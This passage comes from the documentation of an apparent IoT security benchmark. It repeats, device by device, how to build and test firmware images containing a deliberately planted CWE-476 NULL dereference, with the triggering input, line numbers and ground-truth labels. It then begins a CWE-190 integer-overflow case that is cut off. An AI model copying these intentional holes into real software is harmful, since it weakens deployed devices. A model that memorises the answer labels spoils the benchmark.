`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh envsensor`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/envsensor-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — healthmonitor

Simulated category: **health monitor**. Existing device directory:
`meta-iotbench/recipes-devices/healthmonitor/`. Firmware directory:
`deploy-images/healthmonitor-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-healthmonitor-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-healthmonitor-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=healthmonitor-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/healthmonitor-cwe476-null-pointer-dereference/qemuarm64/iotbench-healthmonitor-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device healthmonitor
~~~

For manual boot use `FIRMWARE=healthmonitor-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh healthmonitor`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/healthmonitor-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — ipcamera

Simulated category: **surveillance IP camera**. Existing device directory:
`meta-iotbench/recipes-devices/ipcamera/`. Firmware directory:
`deploy-images/ipcamera-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-ipcamera-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-ipcamera-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=ipcamera-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/ipcamera-cwe476-null-pointer-dereference/qemuarm64/iotbench-ipcamera-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device ipcamera
~~~

For manual boot use `FIRMWARE=ipcamera-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh ipcamera`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/ipcamera-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — plc

Simulated category: **industrial PLC gateway (OT)**. Existing device directory:
`meta-iotbench/recipes-devices/plc/`. Firmware directory:
`deploy-images/plc-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-plc-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-plc-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=plc-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/plc-cwe476-null-pointer-dereference/qemuarm64/iotbench-plc-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device plc
~~~

For manual boot use `FIRMWARE=plc-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh plc`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/plc-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — router

Simulated category: **network gateway**. Existing device directory:
`meta-iotbench/recipes-devices/router/`. Firmware directory:
`deploy-images/router-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-router-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-router-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=router-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/router-cwe476-null-pointer-dereference/qemuarm64/iotbench-router-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device router
~~~

For manual boot use `FIRMWARE=router-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh router`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/router-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — smartbulb

Simulated category: **lighting / smart bulb**. Existing device directory:
`meta-iotbench/recipes-devices/smartbulb/`. Firmware directory:
`deploy-images/smartbulb-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-smartbulb-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-smartbulb-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=smartbulb-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartbulb-cwe476-null-pointer-dereference/qemuarm64/iotbench-smartbulb-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device smartbulb
~~~

For manual boot use `FIRMWARE=smartbulb-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh smartbulb`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/smartbulb-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — smarthub

Simulated category: **controller / smart hub**. Existing device directory:
`meta-iotbench/recipes-devices/smarthub/`. Firmware directory:
`deploy-images/smarthub-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-smarthub-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-smarthub-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=smarthub-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smarthub-cwe476-null-pointer-dereference/qemuarm64/iotbench-smarthub-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device smarthub
~~~

For manual boot use `FIRMWARE=smarthub-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh smarthub`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/smarthub-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — smartplug

Simulated category: **energy-management smart plug**. Existing device directory:
`meta-iotbench/recipes-devices/smartplug/`. Firmware directory:
`deploy-images/smartplug-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-smartplug-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-smartplug-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=smartplug-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartplug-cwe476-null-pointer-dereference/qemuarm64/iotbench-smartplug-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device smartplug
~~~

For manual boot use `FIRMWARE=smartplug-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh smartplug`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/smartplug-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — smartspeaker

Simulated category: **audio / voice-assistant speaker**. Existing device directory:
`meta-iotbench/recipes-devices/smartspeaker/`. Firmware directory:
`deploy-images/smartspeaker-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-smartspeaker-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-smartspeaker-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=smartspeaker-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/smartspeaker-cwe476-null-pointer-dereference/qemuarm64/iotbench-smartspeaker-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device smartspeaker
~~~

For manual boot use `FIRMWARE=smartspeaker-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh smartspeaker`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/smartspeaker-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

### Null Pointer Dereference — thermostat

Simulated category: **climate-control thermostat**. Existing device directory:
`meta-iotbench/recipes-devices/thermostat/`. Firmware directory:
`deploy-images/thermostat-cwe476-null-pointer-dereference/<machine>/`; default image:
`iotbench-thermostat-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst`, with kernel `Image` beside it.
Image recipe: `meta-iotbench/recipes-images/iotbench-thermostat-cwe476-null-pointer-dereference.bb`.
Sole vulnerability package: `cwe476-null-pointer-dereference`.

Native executable: `/usr/bin/fixture-device-info`. Corresponding source:
`meta-iotbench/recipes-vulns/cwe476-null-pointer-dereference/files/fixture-device-info.c`,
also installed as `/usr/share/iotbench/null-pointer-dereference/fixture-device-info.c`.
Its harmless purpose is retrieving predefined synthetic device information.
Record 1 is `public` / `SYNTHETIC_PUBLIC_FIXTURE_DATA`; record 2 is
`status` / `SYNTHETIC_STATUS_FIXTURE_DATA`, compiled into the initialized table.

Input `argv[1]` becomes `input` at **line 38**, after the argument-count check.
**`lookup_record()` at lines 17–27** compares this name against both records.
An existing name returns its record pointer at **line 23**. Any unknown name,
including `missing-record`, reaches **`return NULL` at line 26**. Local variable
**`record` receives the nullable result at line 39**. NULL validation is
intentionally absent between lines 39 and 43. The first unsafe dereference is
**`record->id` at line 43**; line 44 subsequently accesses `record->value`.

Expected static-analysis flow: `input "missing-record"` → `lookup_record(input)`
→ `return NULL` → `record = NULL` → `no NULL check` → `record->id`
→ `Null Pointer Dereference`. The absent name naturally selects the NULL return,
and the caller accesses the structure member regardless of lookup success.
Expected finding: unchecked nullable return from an input-dependent lookup,
**CWE-476: NULL Pointer Dereference**. Exact ground-truth label:
**Vulnerable C Binaries — Null Pointer Dereference**.
Remediation: check `record == NULL` and return an error before any member access,
as shown in the shared secure alternative; leave this fixture vulnerable.

Build and static validation (host repository root):

~~~bash
FIRMWARE=thermostat-cwe476-null-pointer-dereference docker compose run --rm yocto
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py --static
docker compose run --rm yocto python3 /scripts/test-null-pointer-dereference.py \
  --debugfs /workdir/build/tmp/sysroots-components/aarch64/e2fsprogs-native/sbin/debugfs \
  --image /export/thermostat-cwe476-null-pointer-dereference/qemuarm64/iotbench-thermostat-cwe476-null-pointer-dereference-qemuarm64.rootfs.ext4.zst
~~~

Optional runtime validation (host, no manually running QEMU):

~~~bash
python3 scripts/test-null-pointer-dereference.py --device thermostat
~~~

For manual boot use `FIRMWARE=thermostat-cwe476-null-pointer-dereference
./scripts/run-qemu.sh` on one line. Inside its guest serial console,
`fixture-device-info public` prints `Record ID: 1` and
`Record Value: SYNTHETIC_PUBLIC_FIXTURE_DATA`, exiting 0. Run
`sh /usr/share/iotbench/null-pointer-dereference/test-guest.sh thermostat`
for all five isolated guest assertion groups, including the missing-record
fault at address zero; the script disables core dumps. Use the packaged diagnostic
supervisor for a bounded manual fault check with core dumps disabled. Shared build/static/
runtime procedures above apply, including ELF architecture selection and
unprivileged execution. Per-image runtime results, when available, are in
`deploy-images/thermostat-cwe476-null-pointer-dereference/qemuarm64/validation-console.log`;
the completed-validation section states which results were actually observed.

## Vulnerable C Binaries — Integer Overflow

### Build, boot and manual testing

**What this tests.** The program multiplies a record count by 1024 using a
32-bit unsigned integer. For `4194304`, the mathematical product is 4294967296,
but the stored value wraps to zero; the capacity check then incorrectly accepts
the batch.

**Build and boot — host:**

```bash
FIRMWARE=router-cwe190-integer-overflow docker compose run --rm yocto
QEMU_HTTP_PORT=18080 FIRMWARE=router-cwe190-integer-overflow ./scripts/run-qemu.sh
```

**Test — guest:**

```sh
fixture-batch-size 2
echo "exit=$?"
fixture-batch-size 5
echo "exit=$?"
fixture-batch-size 4194304
echo "exit=$?"
```

| Input | Expected `total_size` | Expected fixture decision |
| --- | --- | --- |
| `2` | `2048` | `Synthetic batch accepted` |
| `5` | `5120` | `Synthetic batch exceeds capacity` |
| `4194304` | `0` | `Synthetic batch accepted`; incorrect acceptance |

All three return `exit=0`: exceeding capacity is also a valid application
result. The zero value together with acceptance for the last input demonstrates
